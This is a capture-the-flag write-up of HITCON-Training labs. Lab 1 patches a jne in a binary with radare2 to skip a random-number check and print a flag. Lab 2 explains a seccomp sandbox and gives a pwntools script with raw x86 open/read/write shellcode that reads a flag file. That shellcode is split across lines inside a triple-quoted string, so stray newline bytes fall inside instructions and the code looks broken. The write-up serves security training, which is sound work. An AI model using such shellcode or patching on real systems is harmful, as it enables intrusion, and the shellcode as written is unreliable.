# HITCON Training Writeup

[HITCON-Training](https://github.com/scwuaptx/HITCON-Training)

## Lab 1
```
lab1$ ./sysmagic
Give me maigc :123
```
Nothing happend. Let me see strings from data section.
```
lab1$ rabin2 -z sysmagic
vaddr=0x08048830 paddr=0x00000830 ordinal=000 sz=13 len=12 section=.rodata type=ascii string=/dev/urandom
vaddr=0x0804883d paddr=0x0000083d ordinal=001 sz=16 len=15 section=.rodata type=ascii string=Give me maigc :
```
`/dev/urandom` can help generate random numbers, so we can guess it generate random number first and then compare with the number we input (maigc).

I opened the binary with radare2 using `-w` to be in write mode, allowing radare2 to write data to the file. and `aa` tells radare2 to analyse the whole binary, `afl` list all functions.
```
lab1$ radare2 -w sysmagic
 -- Press 'C' in visual mode to toggle colors
[0x080484a0]> aa
[x] Analyze all flags starting with sym. and entry0 (aa)
[0x080484a0]> afl
0x080483dc    3 35           sym._init
0x08048410    1 6            sym.imp.read
0x08048420    1 6            sym.imp.printf
0x08048430    1 6            sym.imp.__stack_chk_fail
0x08048440    1 6            sym.imp.open
0x08048450    1 6            sym.imp.__libc_start_main
0x08048460    1 6            sym.imp.setvbuf
0x08048470    1 6            sym.imp.putchar
0x08048480    1 6            sym.imp.__isoc99_scanf
0x08048490    1 6            fcn.08048490
0x080484a0    1 33           entry0
0x080484d0    1 4            sym.__x86.get_pc_thunk.bx
0x080484e0    4 43           sym.deregister_tm_clones
0x08048510    4 53           sym.register_tm_clones
0x08048550    3 30           sym.__do_global_dtors_aux
0x08048570    4 43   -> 40   sym.frame_dummy
0x0804859b    7 473          sym.get_flag
0x08048774    1 55           sym.main
0x080487b0    4 93           sym.__libc_csu_init
0x08048810    1 2            sym.__libc_csu_fini
0x08048814    1 20           sym._fini
```

We found the fuction `sym.get_flag`, so we use `pdf @ sym.get_flag` command and focus on these lines:
```
[0x080484a0]> pdf @ sym.get_flag
/ (fcn) sym.get_flag 473
|   sym.get_flag ();
|              ; CALL XREF from 0x08048799 (sym.main)
|           0x0804859b      55             push ebp
|           0x0804859c      89e5           mov ebp, esp
|           0x0804859e      81ec88000000   sub esp, 0x88
|           0x080485a4      65a114000000   mov eax, dword gs:[0x14]    ; [0x14:4]=1
|           0x080485aa      8945f4         mov dword [local_ch], eax
|           0x080485ad      31c0           xor eax, eax
|           0x080485af      c745c2446f5f.  mov dword [local_3eh], 0x795f6f44
|           0x080485b6      c745c66f755f.  mov dword [local_3ah], 0x6b5f756f
|           0x080485bd      c745ca6e6f77.  mov dword [local_36h], 0x5f776f6e
|           0x080485c4      c745ce776879.  mov dword [local_32h], 0x5f796877
|           0x080485cb      c745d26d795f.  mov dword [local_2eh], 0x745f796d
|           0x080485d2      c745d665616d.  mov dword [local_2ah], 0x6d6d6165
|           0x080485d9      c745da617465.  mov dword [local_26h], 0x5f657461
|           0x080485e0      c745de4f7261.  mov dword [local_22h], 0x6e61724f
|           0x080485e7      c745e267655f.  mov dword [local_1eh], 0x695f6567
|           0x080485ee      c745e6735f73.  mov dword [local_1ah], 0x6f735f73
|           0x080485f5      c745ea5f616e.  mov dword [local_16h], 0x676e615f
|           0x080485fc      c745ee72793f.  mov dword [local_12h], 0x3f3f7972
|           0x08048603      66c745f23f00   mov word [local_eh], 0x3f   ; '?'
|           0x08048609      c6459107       mov byte [local_6fh], 7
|           0x0804860d      c645923b       mov byte [local_6eh], 0x3b  ; ';'
|           0x08048611      c6459319       mov byte [local_6dh], 0x19
|           0x08048615      c6459402       mov byte [local_6ch], 2
|           0x08048619      c645950b       mov byte [local_6bh], 0xb
|           0x0804861d      c6459610       mov byte [local_6ah], 0x10
|           0x08048621      c645973d       mov byte [local_69h], 0x3d  ; '='
|           0x08048625      c645981e       mov byte [local_68h], 0x1e
|           0x08048629      c6459909       mov byte [local_67h], 9
|           0x0804862d      c6459a08       mov byte [local_66h], 8
|           0x08048631      c6459b12       mov byte [local_65h], 0x12
|           0x08048635      c6459c2d       mov byte [local_64h], 0x2d  ; '-'
|           0x08048639      c6459d28       mov byte [local_63h], 0x28  ; '('
|           0x0804863d      c6459e59       mov byte [local_62h], 0x59  ; 'Y'
|           0x08048641      c6459f0a       mov byte [local_61h], 0xa
|           0x08048645      c645a000       mov byte [local_60h], 0
|           0x08048649      c645a11e       mov byte [local_5fh], 0x1e
|           0x0804864d      c645a216       mov byte [local_5eh], 0x16
|           0x08048651      c645a300       mov byte [local_5dh], 0
|           0x08048655      c645a404       mov byte [local_5ch], 4
|           0x08048659      c645a555       mov byte [local_5bh], 0x55  ; 'U'
|           0x0804865d      c645a616       mov byte [local_5ah], 0x16
|           0x08048661      c645a708       mov byte [local_59h], 8
|           0x08048665      c645a81f       mov byte [local_58h], 0x1f
|           0x08048669      c645a907       mov byte [local_57h], 7
|           0x0804866d      c645aa01       mov byte [local_56h], 1
|           0x08048671      c645ab09       mov byte [local_55h], 9
|           0x08048675      c645ac00       mov byte [local_54h], 0
|           0x08048679      c645ad7e       mov byte [local_53h], 0x7e  ; '~'
|           0x0804867d      c645ae1c       mov byte [local_52h], 0x1c
|           0x08048681      c645af3e       mov byte [local_51h], 0x3e  ; '>'
|           0x08048685      c645b00a       mov byte [local_50h], 0xa
|           0x08048689      c645b11e       mov byte [local_4fh], 0x1e
|           0x0804868d      c645b20b       mov byte [local_4eh], 0xb
|           0x08048691      c645b36b       mov byte [local_4dh], 0x6b  ; 'k'
|           0x08048695      c645b404       mov byte [local_4ch], 4
|           0x08048699      c645b542       mov byte [local_4bh], 0x42  ; 'B'
|           0x0804869d      c645b63c       mov byte [local_4ah], 0x3c  ; '<'
|           0x080486a1      c645b72c       mov byte [local_49h], 0x2c  ; ','
|           0x080486a5      c645b85b       mov byte [local_48h], 0x5b  ; '['
|           0x080486a9      c645b931       mov byte [local_47h], 0x31  ; '1'
|           0x080486ad      c645ba55       mov byte [local_46h], 0x55  ; 'U'
|           0x080486b1      c645bb02       mov byte [local_45h], 2
|           0x080486b5      c645bc1e       mov byte [local_44h], 0x1e
|           0x080486b9      c645bd21       mov byte [local_43h], 0x21  ; '!'
|           0x080486bd      c645be10       mov byte [local_42h], 0x10
|           0x080486c1      c645bf4c       mov byte [local_41h], 0x4c  ; 'L'
|           0x080486c5      c645c01e       mov byte [local_40h], 0x1e
|           0x080486c9      c645c142       mov byte [local_3fh], 0x42  ; 'B'
|           0x080486cd      83ec08         sub esp, 8
|           0x080486d0      6a00           push 0
|           0x080486d2      6830880408     push str._dev_urandom       ; "/dev/urandom" @ 0x8048830
|           0x080486d7      e864fdffff     call sym.imp.open          ; int open(const char *path, int oflag)
|           0x080486dc      83c410         add esp, 0x10
|           0x080486df      89458c         mov dword [local_74h], eax
|           0x080486e2      83ec04         sub esp, 4
|           0x080486e5      6a04           push 4
|           0x080486e7      8d4580         lea eax, dword [local_80h]
|           0x080486ea      50             push eax
|           0x080486eb      ff758c         push dword [local_74h]
|           0x080486ee      e81dfdffff     call sym.imp.read          ; ssize_t read(int fildes, void *buf, size_t nbyte)
|           0x080486f3      83c410         add esp, 0x10
|           0x080486f6      83ec0c         sub esp, 0xc
|           0x080486f9      683d880408     push str.Give_me_maigc_:    ; "Give me maigc :" @ 0x804883d
|           0x080486fe      e81dfdffff     call sym.imp.printf        ; int printf(const char *format)
|           0x08048703      83c410         add esp, 0x10
|           0x08048706      83ec08         sub esp, 8
|           0x08048709      8d4584         lea eax, dword [local_7ch]
|           0x0804870c      50             push eax
|           0x0804870d      684d880408     push 0x804884d              ; "%d"
|           0x08048712      e869fdffff     call sym.imp.__isoc99_scanf; int scanf(const char *format)
|           0x08048717      83c410         add esp, 0x10
|           0x0804871a      8b5580         mov edx, dword [local_80h]
|           0x0804871d      8b4584         mov eax, dword [local_7ch]
|           0x08048720      39c2           cmp edx, eax
|       ,=< 0x08048722      753c           jne 0x8048760
|       |   0x08048724      c74588000000.  mov dword [local_78h], 0
|      ,==< 0x0804872b      eb2b           jmp 0x8048758
|     .---> 0x0804872d      8d5591         lea edx, dword [local_6fh]
|     |||   0x08048730      8b4588         mov eax, dword [local_78h]
|     |||   0x08048733      01d0           add eax, edx
|     |||   0x08048735      0fb608         movzx ecx, byte [eax]
|     |||   0x08048738      8d55c2         lea edx, dword [local_3eh]
|     |||   0x0804873b      8b4588         mov eax, dword [local_78h]
|     |||   0x0804873e      01d0           add eax, edx
|     |||   0x08048740      0fb600         movzx eax, byte [eax]
|     |||   0x08048743      31c8           xor eax, ecx
|     |||   0x08048745      0fbec0         movsx eax, al
|     |||   0x08048748      83ec0c         sub esp, 0xc
|     |||   0x0804874b      50             push eax
|     |||   0x0804874c      e81ffdffff     call sym.imp.putchar       ; int putchar(int c)
|     |||   0x08048751      83c410         add esp, 0x10
|     |||   0x08048754      83458801       add dword [local_78h], 1
|     !||      ; JMP XREF from 0x0804872b (sym.get_flag)
|     |`--> 0x08048758      8b4588         mov eax, dword [local_78h]
|     | |   0x0804875b      83f830         cmp eax, 0x30               ; '0' ; '0'
|     `===< 0x0804875e      76cd           jbe 0x804872d
|       `-> 0x08048760      90             nop
|           0x08048761      8b45f4         mov eax, dword [local_ch]
|           0x08048764      653305140000.  xor eax, dword gs:[0x14]
|       ,=< 0x0804876b      7405           je 0x8048772
|       |   0x0804876d      e8befcffff     call sym.imp.__stack_chk_fail; void __stack_chk_fail(void)
|       `-> 0x08048772      c9             leave
\           0x08048773      c3             ret
```
At `0x08048720` is a `cmp` instruction, it compare the random number generated using `/dev/urandom` before with the number we inputed. The next line shows that if these two numbers not equal, it will jump to `0x8048760` and we get fail. So we can use `nop` instruction to replace the `jne` instruction at `0x08048722`.
```
[0x080484a0]> s 0x08048722
[0x08048722]> pd 5
|       ,=< 0x08048722      753c           jne 0x8048760
|       |   0x08048724      c74588000000.  mov dword [local_78h], 0
|      ,==< 0x0804872b      eb2b           jmp 0x8048758
|      ||   0x0804872d      8d5591         lea edx, dword [local_6fh]
|      ||   0x08048730      8b4588         mov eax, dword [local_78h]
[0x08048722]> wx 9090
[0x08048722]> pd 5
|           0x08048722      90             nop
|           0x08048723      90             nop
|           0x08048724      c74588000000.  mov dword [local_78h], 0
|       ,=< 0x0804872b      eb2b           jmp 0x8048758
|       |   0x0804872d      8d5591         lea edx, dword [local_6fh]
```
> `s` lets you seek to an address (or symbol)

> `pd #` lets you print disassembly of `#` instructions (from current seek)

> `wx` is short for Write heX, and allows for writing raw bytes to an offset specificly.

This time we get the flag:
```
lab1$ ./sysmagic
Give me maigc :123
CTF{debugger_1s_so_p0werful_1n_dyn4m1c_4n4lySis!}
```

Finally, let's see the source code:

```
#include <stdio.h>
#include <unistd.h>

void get_flag(){
	int fd ;
	int password;
	int magic ;
	char key[] = "Do_you_know_why_my_teammate_Orange_is_so_angry???";
	char cipher[] = {7, 59, 25, 2, 11, 16, 61, 30, 9, 8, 18, 45, 40, 89, 10, 0, 30, 22, 0, 4, 85, 22, 8, 31, 7, 1, 9, 0, 126, 28, 62, 10, 30, 11, 107, 4, 66, 60, 44, 91, 49, 85, 2, 30, 33, 16, 76, 30, 66};
	fd = open("/dev/urandom",0);
	read(fd,&password,4);
	printf("Give me maigc :");
	scanf("%d",&magic);
	if(password == magic){
		for(int i = 0 ; i < sizeof(cipher) ; i++){
			printf("%c",cipher[i]^key[i]);
		}
	}
}

int main(){
	setvbuf(stdout,0,2,0);
	get_flag();
	return 0 ;
}
```

## Lab 2
```
[0x080483d0]> pdf @ sym.main
            ;-- main:
/ (fcn) sym.main 81
|   sym.main ();
|           ; var int local_4h_2 @ ebp-0x4
|           ; var int local_4h @ esp+0x4
|              ; DATA XREF from 0x080483e7 (entry0)
|           0x08048548      8d4c2404       lea ecx, dword [local_4h]   ; 0x4
|           0x0804854c      83e4f0         and esp, 0xfffffff0
|           0x0804854f      ff71fc         push dword [ecx - 4]
|           0x08048552      55             push ebp
|           0x08048553      89e5           mov ebp, esp
|           0x08048555      51             push ecx
|           0x08048556      83ec04         sub esp, 4
|           0x08048559      e86dffffff     call sym.orw_seccomp
|           0x0804855e      83ec0c         sub esp, 0xc
|           0x08048561      68a0860408     push str.Give_my_your_shellcode: ; "Give my your shellcode:" @ 0x80486a0
|           0x08048566      e815feffff     call sym.imp.printf        ; int printf(const char *format)
|           0x0804856b      83c410         add esp, 0x10
|           0x0804856e      83ec04         sub esp, 4
|           0x08048571      68c8000000     push 0xc8
|           0x08048576      6860a00408     push obj.shellcode          ; obj.shellcode
|           0x0804857b      6a00           push 0
|           0x0804857d      e8eefdffff     call sym.imp.read          ; ssize_t read(int fildes, void *buf, size_t nbyte)
|           0x08048582      83c410         add esp, 0x10
|           0x08048585      b860a00408     mov eax, obj.shellcode      ; obj.shellcode
|           0x0804858a      ffd0           call eax
|           0x0804858c      b800000000     mov eax, 0
|           0x08048591      8b4dfc         mov ecx, dword [local_4h_2]
|           0x08048594      c9             leave
|           0x08048595      8d61fc         lea esp, dword [ecx - 4]
\           0x08048598      c3             ret
[0x080483d0]> pdf @ sym.orw_seccomp
/ (fcn) sym.orw_seccomp 125
|   sym.orw_seccomp ();
|           ; var int local_84h @ ebp-0x84
|           ; var int local_80h @ ebp-0x80
|           ; var int local_7ch @ ebp-0x7c
|           ; var int local_1ch @ ebp-0x1c
|           ; var int local_ch @ ebp-0xc
|              ; CALL XREF from 0x08048559 (sym.main)
|           0x080484cb      55             push ebp
|           0x080484cc      89e5           mov ebp, esp
|           0x080484ce      57             push edi
|           0x080484cf      56             push esi
|           0x080484d0      53             push ebx
|           0x080484d1      83ec7c         sub esp, 0x7c               ; '|'
|           0x080484d4      65a114000000   mov eax, dword gs:[0x14]    ; [0x14:4]=1
|           0x080484da      8945e4         mov dword [local_1ch], eax
|           0x080484dd      31c0           xor eax, eax
|           0x080484df      8d4584         lea eax, dword [local_7ch]
|           0x080484e2      bb40860408     mov ebx, 0x8048640
|           0x080484e7      ba18000000     mov edx, 0x18
|           0x080484ec      89c7           mov edi, eax
|           0x080484ee      89de           mov esi, ebx
|           0x080484f0      89d1           mov ecx, edx
|           0x080484f2      f3a5           rep movsd dword es:[edi], dword ptr [esi]
|           0x080484f4      66c7857cffff.  mov word [local_84h], 0xc
|           0x080484fd      8d4584         lea eax, dword [local_7ch]
|           0x08048500      894580         mov dword [local_80h], eax
|           0x08048503      83ec0c         sub esp, 0xc
|           0x08048506      6a00           push 0
|           0x08048508      6a00           push 0
|           0x0804850a      6a00           push 0
|           0x0804850c      6a01           push 1
|           0x0804850e      6a26           push 0x26                   ; '&' ; '&'
|           0x08048510      e89bfeffff     call sym.imp.prctl
|           0x08048515      83c420         add esp, 0x20
|           0x08048518      83ec04         sub esp, 4
|           0x0804851b      8d857cffffff   lea eax, dword [local_84h]
|           0x08048521      50             push eax
|           0x08048522      6a02           push 2
|           0x08048524      6a16           push 0x16
|           0x08048526      e885feffff     call sym.imp.prctl
|           0x0804852b      83c410         add esp, 0x10
|           0x0804852e      90             nop
|           0x0804852f      8b45e4         mov eax, dword [local_1ch]
|           0x08048532      653305140000.  xor eax, dword gs:[0x14]
|       ,=< 0x08048539      7405           je 0x8048540
|       |   0x0804853b      e850feffff     call sym.imp.__stack_chk_fail; void __stack_chk_fail(void)
|       `-> 0x08048540      8d65f4         lea esp, dword [local_ch]
|           0x08048543      5b             pop ebx
|           0x08048544      5e             pop esi
|           0x08048545      5f             pop edi
|           0x08048546      5d             pop ebp
\           0x08048547      c3             ret
```
The lab seems to execute shellcode you entered. But as the lab's name (orw) show, we just can get the flag using open, read and write syscall. Let's see what the function `prctl` means. (`man prctl` command)
```
NAME
       prctl - operations on a process

SYNOPSIS
       #include <sys/prctl.h>

       int prctl(int option, unsigned long arg2, unsigned long arg3,
                 unsigned long arg4, unsigned long arg5);

DESCRIPTION
       prctl()  is  called  with a first argument describing what to do (with
       values defined in <linux/prctl.h>), and further arguments with a  sig‐
       nificance depending on the first one.
```
So, these two `prctl` functions in `sym.orw_seccomp` have the first argument `0x26 (38)` and `0x16 (22)`.

Then the `prctl.h`. (`cat /usr/include/linux/prctl.h`):
```
/* Get/set process seccomp mode */
#define PR_GET_SECCOMP	21
#define PR_SET_SECCOMP	22
```
```
PR_SET_SECCOMP (since Linux 2.6.23)
       Set the secure computing (seccomp) mode for the calling thread, to limit the available system calls.  The more recent seccomp(2) system call provides a superset of the functionality of
       PR_SET_SECCOMP.

       The seccomp mode is selected via arg2.  (The seccomp constants are defined in <linux/seccomp.h>.)

       With  arg2 set to SECCOMP_MODE_STRICT, the only system calls that the thread is permitted to make are read(2), write(2), _exit(2) (but not exit_group(2)), and sigreturn(2).  Other sys‐
       tem calls result in the delivery of a SIGKILL signal.  Strict secure computing mode is useful for number-crunching applications that may need to execute untrusted  byte  code,  perhaps
       obtained by reading from a pipe or socket.  This operation is available only if the kernel is configured with CONFIG_SECCOMP enabled.

       With  arg2  set  to  SECCOMP_MODE_FILTER (since Linux 3.5), the system calls allowed are defined by a pointer to a Berkeley Packet Filter passed in arg3.  This argument is a pointer to
       struct sock_fprog; it can be designed to filter arbitrary system calls and system call arguments.  This mode is available only if the kernel is  configured  with  CONFIG_SECCOMP_FILTER
       enabled.

       If  SECCOMP_MODE_FILTER  filters permit fork(2), then the seccomp mode is inherited by children created by fork(2); if execve(2) is permitted, then the seccomp mode is preserved across
       execve(2).  If the filters permit prctl() calls, then additional filters can be added; they are run in order until the first non-allow result is seen.
```
```
/*
 * If no_new_privs is set, then operations that grant new privileges (i.e.
 * execve) will either fail or not grant them.  This affects suid/sgid,
 * file capabilities, and LSMs.
 *
 * Operations that merely manipulate or drop existing privileges (setresuid,
 * capset, etc.) will still work.  Drop those privileges if you want them gone.
 *
 * Changing LSM security domain is considered a new privilege.  So, for example,
 * asking selinux for a specific new context (e.g. with runcon) will result
 * in execve returning -EPERM.
 *
 * See Documentation/prctl/no_new_privs.txt for more details.
 */
#define PR_SET_NO_NEW_PRIVS	38
#define PR_GET_NO_NEW_PRIVS	39

#define PR_GET_TID_ADDRESS	40

#define PR_SET_THP_DISABLE	41
#define PR_GET_THP_DISABLE	42
```
```
PR_SET_NO_NEW_PRIVS (since Linux 3.5)
       Set  the  calling  thread's  no_new_privs bit to the value in arg2.  With no_new_privs set to 1, execve(2) promises not to grant privileges to do anything that could not have been done
       without the execve(2) call (for example, rendering the set-user-ID and set-group-ID mode bits, and file capabilities non-functional).  Once set, this bit cannot be unset.  The  setting
       of this bit is inherited by children created by fork(2) and clone(2), and preserved across execve(2).
```
We found `The seccomp mode is selected via arg2.  (The seccomp constants are defined in <linux/seccomp.h>.)`, and these two `prctl` functions in `sym.orw_seccomp`'s arg2 are `1` and `2`. Let's see `seccomp.h`.
```
/* Valid values for seccomp.mode and prctl(PR_SET_SECCOMP, <mode>) */
#define SECCOMP_MODE_STRICT	1 /* uses hard-coded filter. */
#define SECCOMP_MODE_FILTER	2 /* uses user-supplied filter. */
```
```
SECCOMP_SET_MODE_STRICT
       The only system calls that the calling thread is permitted to make are read(2), write(2), _exit(2) (but not exit_group(2)), and sigreturn(2).  Other system calls result in the delivery
       of a SIGKILL signal.  Strict secure computing mode is useful for number-crunching applications that may need to execute untrusted byte code, perhaps obtained by reading from a pipe  or
       socket.

       Note  that  although  the  calling thread can no longer call sigprocmask(2), it can use sigreturn(2) to block all signals apart from SIGKILL and SIGSTOP.  This means that alarm(2) (for
       example) is not sufficient for restricting the process's execution time.  Instead, to reliably terminate the process, SIGKILL must be used.  This can be done by  using  timer_create(2)
       with SIGEV_SIGNAL and sigev_signo set to SIGKILL, or by using setrlimit(2) to set the hard limit for RLIMIT_CPU.

       This operation is available only if the kernel is configured with CONFIG_SECCOMP enabled.

       The value of flags must be 0, and args must be NULL.

       This operation is functionally identical to the call:

           prctl(PR_SET_SECCOMP, SECCOMP_MODE_STRICT);

SECCOMP_SET_MODE_FILTER
       The  system  calls  allowed are defined by a pointer to a Berkeley Packet Filter (BPF) passed via args.  This argument is a pointer to a struct sock_fprog; it can be designed to filter
       arbitrary system calls and system call arguments.  If the filter is invalid, seccomp() fails, returning EINVAL in errno.

       If fork(2) or clone(2) is allowed by the filter, any child processes will be constrained to the same system call filters as the parent.  If execve(2) is allowed, the  existing  filters
       will be preserved across a call to execve(2).

       In  order to use the SECCOMP_SET_MODE_FILTER operation, either the caller must have the CAP_SYS_ADMIN capability in its user namespace, or the thread must already have the no_new_privs
       bit set.  If that bit was not already set by an ancestor of this thread, the thread must make the following call:

           prctl(PR_SET_NO_NEW_PRIVS, 1);

       Otherwise, the SECCOMP_SET_MODE_FILTER operation will fail and return EACCES in errno.  This requirement ensures that an unprivileged process cannot apply a malicious filter  and  then
       invoke  a  set-user-ID  or  other  privileged program using execve(2), thus potentially compromising that program.  (Such a malicious filter might, for example, cause an attempt to use
       setuid(2) to set the caller's user IDs to non-zero values to instead return 0 without actually making the system call.  Thus, the program might  be  tricked  into  retaining  superuser
       privileges in circumstances where it is possible to influence it to do dangerous things because it did not actually drop privileges.)

       If  prctl(2)  or  seccomp() is allowed by the attached filter, further filters may be added.  This will increase evaluation time, but allows for further reduction of the attack surface
       during execution of a thread.

       The SECCOMP_SET_MODE_FILTER operation is available only if the kernel is configured with CONFIG_SECCOMP_FILTER enabled.

       When flags is 0, this operation is functionally identical to the call:

           prctl(PR_SET_SECCOMP, SECCOMP_MODE_FILTER, args);
```
So, the most important `prctl` is the second, and it limit the available system calls. We need write shellcode only use open, read, and write syscall.
```
from pwn import *

p = process('./orw.bin')
shellcode = '''
\xba\x00\x00\x00\x00\xb9\x00\x00
\x00\x00\x51\x68\x66\x6c\x61\x67
\x89\xe3\xb8\x05\x00\x00\x00\xcd
\x80\xba\xff\x00\x00\x00\x89\xe1
\x89\xc3\xb8\x03\x00\x00\x00\xcd
\x80\xba\xff\x00\x00\x00\x89\xe1
\xbb\x01\x00\x00\x00\xb8\x04\x00
\x00\x00\xcd\x80\xb8\x01\x00\x00
\x00\xcd\x80
'''
p.send(shellcode)
p.interactive()
```

## Lab 3
